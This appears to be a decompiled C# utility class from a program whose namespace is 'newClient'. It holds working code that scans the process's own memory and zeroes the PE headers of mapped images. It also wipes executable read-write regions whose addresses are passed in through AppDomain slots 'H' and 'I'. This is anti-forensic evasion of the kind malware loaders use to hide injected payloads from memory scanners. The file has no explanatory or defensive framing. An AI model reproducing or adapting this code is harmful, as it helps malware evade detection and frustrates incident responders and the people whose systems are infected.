using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using Models;

namespace newClient.Utilities;

public class ErasePEHeader
{
	public static int PAGE_EXECUTE_READWRITE = 64;

	public static int PAGE_READWRITE = 4;

	public static int MEM_COMMIT = 4096;

	public static int MEM_PRIVATE = 131072;

	public static int MEM_MAPPED = 262144;

	public static int MEM_IMAGE = 16777216;

	public static void SetErasePEHeader()
	{
		try
		{
			SYSTEM_INFO lpSystemInfo = default(SYSTEM_INFO);
			NativeInvoke.GetSystemInfo(out lpSystemInfo);
			long num = (long)(ulong)lpSystemInfo.minimumApplicationAddress;
			long num2 = (long)(ulong)lpSystemInfo.maximumApplicationAddress / 2L;
			IntPtr handle = Process.GetCurrentProcess().Handle;
			MEMORY_BASIC_INFORMATION lpBuffer;
			while (num < num2 && NativeInvoke.VirtualQueryEx(handle, (IntPtr)num, out lpBuffer, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) == (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)))
			{
				if (lpBuffer.Protect == PAGE_READWRITE && lpBuffer.State == MEM_COMMIT && lpBuffer.Type == MEM_MAPPED)
				{
					byte[] array = new byte[64];
					Marshal.Copy(lpBuffer.BaseAddress, array, 0, 64);
					if (array[0] == 77 && array[1] == 90)
					{
						int num3 = BitConverter.ToInt32(array, 60);
						if ((long)lpBuffer.RegionSize > 4096)
						{
							byte[] array2 = Enumerable.Repeat((byte)0, num3).ToArray();
							array2[0] = 80;
							array2[1] = 69;
							Marshal.Copy(array2, 0, lpBuffer.BaseAddress, num3);
							Marshal.Copy(array, 60, (IntPtr)((long)lpBuffer.BaseAddress + 60), 4);
						}
					}
				}
				num = (long)lpBuffer.BaseAddress + (long)lpBuffer.RegionSize;
			}
		}
		catch (Exception ex)
		{
			Logger.Info(ex.Message + "\r\n" + ex.StackTrace);
		}
	}

	public static void SetEraseRWX()
	{
		try
		{
			object data = AppDomain.CurrentDomain.GetData("H");
			if (data == null)
			{
				data = AppDomain.CurrentDomain.GetData("I");
				if (data == null)
				{
					return;
				}
			}
			int num = int.Parse(data.ToString());
			if (NativeInvoke.VirtualQueryEx(Process.GetCurrentProcess().Handle, (IntPtr)num, out var lpBuffer, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) == (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)))
			{
				uint lpflOldProtect;
				if (lpBuffer.Protect == PAGE_EXECUTE_READWRITE && AppDomain.CurrentDomain.GetData("H") != null)
				{
					int num2 = (int)Marshal.ReadIntPtr((IntPtr)num);
					int num3 = (int)Marshal.ReadIntPtr((IntPtr)(num + 4 + num2));
					int num4 = num2 + num3 + 8;
					Marshal.Copy(Enumerable.Repeat((byte)0, num4).ToArray(), 0, (IntPtr)num, num4);
					NativeInvoke.VirtualProtect((IntPtr)num, (IntPtr)num4, 4u, out lpflOldProtect);
				}
				else if (lpBuffer.Protect == PAGE_EXECUTE_READWRITE && AppDomain.CurrentDomain.GetData("I") != null)
				{
					Marshal.Copy(Enumerable.Repeat((byte)0, 65536).ToArray(), 0, (IntPtr)num, 65536);
					NativeInvoke.VirtualProtect((IntPtr)num, (IntPtr)65536, 4u, out lpflOldProtect);
				}
			}
		}
		catch (Exception ex)
		{
			Logger.Info(ex.Message + "\r\n" + ex.StackTrace);
		}
	}
}
